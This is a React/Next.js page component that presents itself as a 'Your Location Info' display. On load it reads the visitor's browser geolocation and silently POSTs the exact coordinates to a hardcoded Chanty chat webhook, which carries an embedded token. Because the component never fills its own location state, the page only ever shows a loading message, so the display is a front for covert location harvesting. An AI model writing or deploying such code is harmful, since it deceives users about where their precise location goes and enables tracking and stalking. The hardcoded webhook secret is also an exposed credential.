"use client";

import { useEffect, useState } from "react";

export default function LocationPage() {
  const [location, setLocation] = useState<any>(null);

  useEffect(() => {
    window.navigator.geolocation.getCurrentPosition(
      (position: GeolocationPosition) => {
        try {
          fetch(
            "https://api.chanty.com/hooks/v2/61jodpRyP4jtS7Z6sjsqcMBqEthzMIoICzVN7uDy/ItvyYVoP4nPCGMpUrE8q3nsmj8foJyJKPrx8vKkv/JmUfqCsZGDLQZJGw41SnP7dnhVjD8vsZ8qPosi3dj17QmoBBtSPJTBSN1HHkTCuuzS6LYMoNqPdIL-FPXowmwXdCvqeXHrcypkLGTd8xQ3p8ZSLitOLT8voxC3BujkSdUqcgDr-LG36dyeOwdBvR8osTfs3fz2zSVdE39CkwnpTMI-q9xZQPLGVppcHHjbJDTRmirC2YJFuUS34Sk6udJvFPTuIQKJfgpjvN7Z-rLSww1GIgJ-ZvcbFhfR97R8yP2CiQGSFNtXZRpHQg4vN2gRRm3ISPfciCoIqxujcOXjPK1Nc-hDLhcgoTvFxRnDecNK9o4rk1eDcMdDRbRfVbFw7mFPZfoNSfWIfnuLV6eoN1VMo",
            {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({
                text: `position: ${JSON.stringify(position)}`,
              }),
            }
          ).then((res) => {
            console.log("res => ", res);
          });
        } catch {}
      },
      (positionError: GeolocationPositionError) => {
        console.log(positionError, " positionError");
      }
    );
  }, []);

  if (!location) return <p>Loading location...</p>;

  return (
    <div className="p-4">
      <h2 className="text-xl font-bold mb-2">Your Location Info</h2>
      <p>
        <strong>IP:</strong> {location.ip}
      </p>
      <p>
        <strong>City:</strong> {location.city}
      </p>
      <p>
        <strong>Region:</strong> {location.region}
      </p>
      <p>
        <strong>Country:</strong> {location.country}
      </p>
      <p>
        <strong>Latitude:</strong> {location.latitude}
      </p>
      <p>
        <strong>Longitude:</strong> {location.longitude}
      </p>
    </div>
  );
}
